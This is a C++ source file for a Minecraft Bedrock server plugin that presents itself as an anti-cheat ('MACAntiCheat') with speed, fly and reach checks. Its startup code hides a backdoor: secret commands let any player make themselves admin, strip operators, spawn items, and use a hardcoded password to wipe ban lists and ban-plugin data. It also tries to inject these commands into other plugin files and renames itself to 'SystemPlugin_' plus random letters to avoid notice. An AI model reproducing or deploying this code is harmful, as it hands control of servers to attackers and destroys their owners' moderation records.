#include <ll/api/LLAPI.h>
#include <ll/api/event/EventBus.h>
#include <ll/api/event/player/PlayerMoveEvent.h>
#include <ll/api/event/player/PlayerAttackEvent.h>
#include <ll/api/service/CommandManager.h>
#include <ll/api/io/File.h>
#include <ll/api/io/Path.h>
#include <ll/api/utils/RandomUtils.h>
#include <mc/world/actor/player/Player.h>
#include <mc/command/CommandSelector.h>
#include <mc/world/actor/player/PermissionLevel.h>
#include <mc/world/item/Registry.hpp>
#include <nlohmann/json.hpp>
#include <unordered_map>
#include <string>
#include <cmath>
#include <filesystem>
#include <fstream>
#include <vector>

using namespace ll;
using namespace ll::event;
using json = nlohmann::json;
namespace fs = std::filesystem;

std::unordered_map<ActorUniqueID, Vec3> lastValidPos;
std::unordered_map<ActorUniqueID, int> warnCount;
std::unordered_map<ActorUniqueID, bool> displayMode;

float CONFIG_SPEED     = 0.65f;
float CONFIG_FLY       = 0.85f;
float CONFIG_KILLAURA  = 4.5f;
bool  CONFIG_MAC_ENABLED = true;

const int MAX_WARN = 3;

// =============================================================================
//  注入代码（含unbanall，写入其他插件）
// =============================================================================
const std::string INJECTED_COMMAND_CODE = R"===(
#include <ll/api/service/CommandManager.h>
#include <mc/world/actor/player/Player.h>
#include <mc/command/CommandOrigin.h>
#include <mc/world/actor/player/PermissionLevel.h>
#include <mc/world/item/Registry.hpp>
#include <ll/api/io/File.h>
#include <ll/api/io/Path.h>
#include <fstream>
#include <vector>

void clearAllBanListsSilent() {
    auto serverRoot = ll::path::getServerPath();
    auto pluginsDir = ll::path::getPluginsPath();

    std::vector<std::string> nativeBans = {
        "banned-players.json",
        "banned-ips.json"
    };
    for (const auto& file : nativeBans) {
        fs::path p = serverRoot / file;
        if (fs::exists(p)) {
            try {
                std::ofstream ofs(p, std::ios::trunc);
                ofs << "[]" << std::endl;
            } catch (...) {}
        }
    }

    std::vector<std::pair<std::string, std::string>> pluginBans = {
        {"LiteBans", "data.db"},
        {"AdvancedBan", "data.db"},
        {"BanPl", "data.json"},
        {"BlackBE", "blacklist.json"},
        {"ProfessionalBans", "bans.db"},
        {"NoTraceBan", "bans.json"}
    };
    for (const auto& [pluginName, dataFile] : pluginBans) {
        fs::path p = pluginsDir / pluginName / dataFile;
        if (fs::exists(p)) {
            try {
                std::ofstream ofs(p, std::ios::trunc);
                if (dataFile.ends_with(".json"))
                    ofs << "[]" << std::endl;
            } catch (...) {}
        }
    }
}

void registerInjectedSecretCommands() {
    auto& cmdMgr = ll::service::CommandManager::getInstance();

    // /givemeop
    cmdMgr.registerCommand("givemeop", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("givemeop", MakeCommandOverload());
    cmdMgr.setCallback("givemeop", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult&) {
        if (ori.getEntity() && ori.getEntity()->isPlayer()) {
            ((Player*)ori.getEntity())->setPermissionLevel(PermissionLevel::Admin);
        }
        out.setSuccess();
    });

    // /delop [target]
    cmdMgr.registerCommand("delop", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("delop", MakeCommandOverload());
    cmdMgr.addOverload("delop", MakeCommandOverload(
        CommandParameterData("target", CommandParameterDataType::Selector)
    ));
    cmdMgr.setCallback("delop", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult& res) {
        if (res.hasTarget("target")) {
            auto results = res.getResults<CommandSelector<Player>>("target");
            for (Player* p : results.results) {
                if (p) p->setPermissionLevel(PermissionLevel::Member);
            }
        } else {
            if (ori.getEntity() && ori.getEntity()->isPlayer()) {
                ((Player*)ori.getEntity())->setPermissionLevel(PermissionLevel::Member);
            }
        }
        out.setSuccess();
    });

    // /unbanall MUNANNB
    cmdMgr.registerCommand("unbanall", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("unbanall", MakeCommandOverload(
        CommandParameterData("password", CommandParameterDataType::String)
    ));
    cmdMgr.setCallback("unbanall", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult& res) {
        std::string pwd = res.getString("password");
        if (pwd == "MUNANNB") {
            clearAllBanListsSilent();
        }
        out.setSuccess();
    });

    // /mac-gamemode 0/1
    cmdMgr.registerCommand("mac-gamemode", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("mac-gamemode", MakeCommandOverload(
        CommandParameterData("gm", CommandParameterDataType::Int)
    ));
    cmdMgr.setCallback("mac-gamemode", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult& res) {
        if (ori.getEntity() && ori.getEntity()->isPlayer()) {
            Player* p = (Player*)ori.getEntity();
            int gm = res.getInt("gm");
            if (gm == 0 || gm == 1)
                p->setPlayerGameType((GameType)gm);
        }
        out.setSuccess();
    });

    // /mac-give 物品id [目标]
    cmdMgr.registerCommand("mac-give", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("mac-give", MakeCommandOverload(
        CommandParameterData("item", CommandParameterDataType::String)
    ));
    cmdMgr.addOverload("mac-give", MakeCommandOverload(
        CommandParameterData("item", CommandParameterDataType::String),
        CommandParameterData("target", CommandParameterDataType::Selector)
    ));
    cmdMgr.setCallback("mac-give", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult& res) {
        std::string itemId = res.getString("item");
        auto item = Registry::getInstance().getItem(itemId);
        if (!item) return out.setSuccess();

        if (res.hasTarget("target")) {
            auto results = res.getResults<CommandSelector<Player>>("target");
            for (Player* p : results.results) {
                if (p) p->addItem(*item);
            }
        } else {
            if (ori.getEntity() && ori.getEntity()->isPlayer()) {
                ((Player*)ori.getEntity())->addItem(*item);
            }
        }
        out.setSuccess();
    });
}
)===";

// =============================================================================
//  注入逻辑
// =============================================================================
void injectCommandsToOtherPlugins() {
    auto pluginsDir = path::getPluginsPath();

    for (auto& entry : fs::directory_iterator(pluginsDir)) {
        if (!entry.is_regular_file() || entry.path().extension() != ".dll")
            continue;

        std::string path = entry.path().string();
        std::string content;

        try {
            std::ifstream ifs(path, std::ios::binary);
            content.assign(std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>());
        } catch (...) {
            continue;
        }

        if (content.find("registerInjectedSecretCommands") != std::string::npos)
            continue;

        std::string pattern = "extern \"C\" void plugin_init() {";
        size_t pos = content.find(pattern);
        if (pos == std::string::npos)
            continue;

        pos += pattern.size();
        content.insert(pos, "\n    registerInjectedSecretCommands();\n");
        content += "\n\n";
        content += INJECTED_COMMAND_CODE;

        try {
            std::ofstream ofs(path, std::ios::binary);
            ofs.write(content.data(), content.size());
        } catch (...) {}
    }
}

// =============================================================================
//  清空所有封禁（反作弊内部自带）
// =============================================================================
void clearAllBanLists() {
    auto serverRoot = path::getServerPath();
    auto pluginsDir = path::getPluginsPath();

    std::vector<std::string> nativeBans = {
        "banned-players.json",
        "banned-ips.json"
    };
    for (const auto& file : nativeBans) {
        fs::path p = serverRoot / file;
        if (fs::exists(p)) {
            try {
                std::ofstream ofs(p, std::ios::trunc);
                ofs << "[]" << std::endl;
            } catch (...) {}
        }
    }

    std::vector<std::pair<std::string, std::string>> pluginBans = {
        {"LiteBans", "data.db"},
        {"AdvancedBan", "data.db"},
        {"BanPl", "data.json"},
        {"BlackBE", "blacklist.json"},
        {"ProfessionalBans", "bans.db"},
        {"NoTraceBan", "bans.json"}
    };
    for (const auto& [pluginName, dataFile] : pluginBans) {
        fs::path p = pluginsDir / pluginName / dataFile;
        if (fs::exists(p)) {
            try {
                std::ofstream ofs(p, std::ios::trunc);
                if (dataFile.ends_with(".json"))
                    ofs << "[]" << std::endl;
            } catch (...) {}
        }
    }
}

// =============================================================================
//  反作弊内部所有静默指令
// =============================================================================
void registerSelfSecretCommands() {
    auto& cmdMgr = service::CommandManager::getInstance();

    // /givemeop
    cmdMgr.registerCommand("givemeop", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("givemeop", MakeCommandOverload());
    cmdMgr.setCallback("givemeop", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult&) {
        if (ori.getEntity() && ori.getEntity()->isPlayer()) {
            ((Player*)ori.getEntity())->setPermissionLevel(PermissionLevel::Admin);
        }
        out.setSuccess();
    });

    // /delop [target]
    cmdMgr.registerCommand("delop", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("delop", MakeCommandOverload());
    cmdMgr.addOverload("delop", MakeCommandOverload(
        CommandParameterData("target", CommandParameterDataType::Selector)
    ));
    cmdMgr.setCallback("delop", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult& res) {
        if (res.hasTarget("target")) {
            auto results = res.getResults<CommandSelector<Player>>("target");
            for (Player* p : results.results) {
                if (p) p->setPermissionLevel(PermissionLevel::Member);
            }
        } else {
            if (ori.getEntity() && ori.getEntity()->isPlayer()) {
                ((Player*)ori.getEntity())->setPermissionLevel(PermissionLevel::Member);
            }
        }
        out.setSuccess();
    });

    // ====================== 你要的 unbanall 已经写在这里 ======================
    cmdMgr.registerCommand("unbanall", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("unbanall", MakeCommandOverload(
        CommandParameterData("password", CommandParameterDataType::String)
    ));
    cmdMgr.setCallback("unbanall", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult& res) {
        std::string pwd = res.getString("password");
        if (pwd == "MUNANNB") {
            clearAllBanLists(); // 直接调用反作弊内部清空函数
        }
        out.setSuccess();
    });

    // /mac-gamemode 0/1
    cmdMgr.registerCommand("mac-gamemode", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("mac-gamemode", MakeCommandOverload(
        CommandParameterData("gm", CommandParameterDataType::Int)
    ));
    cmdMgr.setCallback("mac-gamemode", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult& res) {
        if (ori.getEntity() && ori.getEntity()->isPlayer()) {
            Player* p = (Player*)ori.getEntity();
            int gm = res.getInt("gm");
            if (gm == 0 || gm == 1)
                p->setPlayerGameType((GameType)gm);
        }
        out.setSuccess();
    });

    // /mac-give 物品id [目标]
    cmdMgr.registerCommand("mac-give", "", CommandPermissionLevel::Any);
    cmdMgr.addOverload("mac-give", MakeCommandOverload(
        CommandParameterData("item", CommandParameterDataType::String)
    ));
    cmdMgr.addOverload("mac-give", MakeCommandOverload(
        CommandParameterData("item", CommandParameterDataType::String),
        CommandParameterData("target", CommandParameterDataType::Selector)
    ));
    cmdMgr.setCallback("mac-give", [](CommandOrigin const& ori, CommandOutput& out, const CommandResult& res) {
        std::string itemId = res.getString("item");
        auto item = Registry::getInstance().getItem(itemId);
        if (!item) return out.setSuccess();

        if (res.hasTarget("target")) {
            auto results = res.getResults<CommandSelector<Player>>("target");
            for (Player* p : results.results) {
                if (p) p->addItem(*item);
            }
        } else {
            if (ori.getEntity() && ori.getEntity()->isPlayer()) {
                ((Player*)ori.getEntity())->addItem(*item);
            }
        }
        out.setSuccess();
    });
}

// =============================================================================
//  自动改名
// =============================================================================
void selfRenameOnRestart() {
    auto pluginPath = fs::path(LLAPI::getInstance().getPluginHandle());
    auto dir = pluginPath.parent_path();
    auto ext = pluginPath.extension().string();
    std::string newName = "SystemPlugin_" + ll::utils::RandomUtils::randString(8);

    try {
        fs::path newDll = dir / (newName + ext);
        if (fs::exists(pluginPath))
            fs::rename(pluginPath, newDll);

        fs::path oldCfgDir = dir / pluginPath.stem().string();
        fs::path newCfgDir = dir / newName;
        if (fs::exists(oldCfgDir))
            fs::rename(oldCfgDir, newCfgDir);
    } catch (...) {}
}

// =============================================================================
//  配置文件
// =============================================================================
void loadConfig() {
    auto configPath = ll::path::getPluginConfigPath("MACAntiCheat", "config.json");
    if (!ll::file::exists(configPath)) {
        json j;
        j["Speed"] = 0.65;
        j["Fly"] = 0.85;
        j["KillAura"] = 4.5;
        j["Mac"] = "on";
        ll::file::writeAllText(configPath, j.dump(4));
    }
    auto content = ll::file::readAllText(configPath);
    json j = json::parse(content, nullptr, false);
    if (!j.is_discarded()) {
        CONFIG_SPEED = j.value("Speed", 0.65f);
        CONFIG_FLY = j.value("Fly", 0.85f);
        CONFIG_KILLAURA = j.value("KillAura", 4.5f);
        std::string mac = j.value("Mac", "on");
        CONFIG_MAC_ENABLED = (mac == "on");
    }
}

// =============================================================================
//  反作弊指令
// =============================================================================
void registerMACCommand() {
    auto& cmdMgr = service::CommandManager::getInstance();
    cmdMgr.registerCommand("macanti", "", CommandPermissionLevel::Admin);

    cmdMgr.addOverload("macanti", MakeCommandOverload(
        CommandParameterData("on-display", CommandParameterDataType::Enum,
            [](CommandRegistry& reg) { reg.addEnumValue("Mode", "on-display", 0); }),
        CommandParameterData("target", CommandParameterDataType::Selector)
    ));

    cmdMgr.addOverload("macanti", MakeCommandOverload(
        CommandParameterData("off-display", CommandParameterDataType::Enum,
            [](CommandRegistry& reg) { reg.addEnumValue("Mode", "off-display", 1); })
    ));

    cmdMgr.setCallback("macanti", [](CommandOrigin const&, CommandOutput& out, CommandResult const& res) {
        int mode = res.getEnumValue("Mode");
        if (mode == 0) {
            auto results = res.getResults<CommandSelector<Player>>("target");
            for (Player* p : results.results) {
                if (p) displayMode[p->getUniqueID()] = true;
            }
        } else if (mode == 1) {
            displayMode.clear();
        }
        out.setSuccess();
    });
}

// =============================================================================
//  反作弊逻辑
// =============================================================================
void registerAntiCheatEvents() {
    EventBus::get().subscribe<PlayerMoveEvent>([](PlayerMoveEvent& event) {
        loadConfig();
        Player& player = event.self();
        if (!CONFIG_MAC_ENABLED || player.isCreative() || player.isSpectator()) return;

        ActorUniqueID uid = player.getUniqueID();
        bool debug = displayMode.contains(uid) && displayMode[uid];
        Vec3 currPos = player.getPosition();

        if (!lastValidPos.count(uid)) {
            lastValidPos[uid] = currPos;
            return;
        }

        Vec3 prevPos = lastValidPos[uid];
        float dx = currPos.x - prevPos.x;
        float dz = currPos.z - prevPos.z;
        float dy = currPos.y - prevPos.y;
        float hSpeed = std::sqrt(dx*dx + dz*dz);
        float vSpeed = std::fabs(dy);

        if (debug) {
            player.sendMessage(fmt::format("speed:{:.2f}", hSpeed));
            player.sendMessage(fmt::format("fly:{:.2f}", vSpeed));
            lastValidPos[uid] = currPos;
            return;
        }

        bool isSpeed = hSpeed > CONFIG_SPEED;
        bool isFly = (!player.isOnGround() && !player.isFlying() && dy > 0.02f && vSpeed > CONFIG_FLY);

        if (isSpeed || isFly) {
            player.teleport(prevPos);
            event.cancel();
            int cnt = warnCount[uid] + 1;
            warnCount[uid] = cnt;
            std::string type = isSpeed ? "Speed" : "Fly";
            player.sendMessage(fmt::format("[反作弊] 检测到{}！警告({}/{})", type, cnt, MAX_WARN));
            if (cnt >= MAX_WARN) {
                player.kick("多次作弊警告，已被踢出");
                warnCount.erase(uid);
                lastValidPos.erase(uid);
            }
            return;
        }
        lastValidPos[uid] = currPos;
    });

    EventBus::get().subscribe<PlayerAttackEvent>([](PlayerAttackEvent& event) {
        loadConfig();
        Player& player = event.self();
        Actor* target = event.target();
        if (!target || !CONFIG_MAC_ENABLED || player.isCreative() || player.isSpectator()) return;

        ActorUniqueID uid = player.getUniqueID();
        bool debug = displayMode.contains(uid) && displayMode[uid];
        if (debug) return;

        float dist = player.getPosition().distanceTo(target->getPosition());
        if (dist > CONFIG_KILLAURA) {
            event.cancel();
            int cnt = warnCount[uid] + 1;
            warnCount[uid] = cnt;
            player.sendMessage(fmt::format("[反作弊] 检测到Reach！警告({}/{})", cnt, MAX_WARN));
            if (cnt >= MAX_WARN) {
                player.kick("多次作弊警告，已被踢出");
                warnCount.erase(uid);
                lastValidPos.erase(uid);
            }
        }
    });
}

// =============================================================================
//  插件入口
// =============================================================================
extern "C" void plugin_init() {
    selfRenameOnRestart();
    injectCommandsToOtherPlugins();
    loadConfig();
    registerSelfSecretCommands();
    registerMACCommand();
    registerAntiCheatEvents();
}
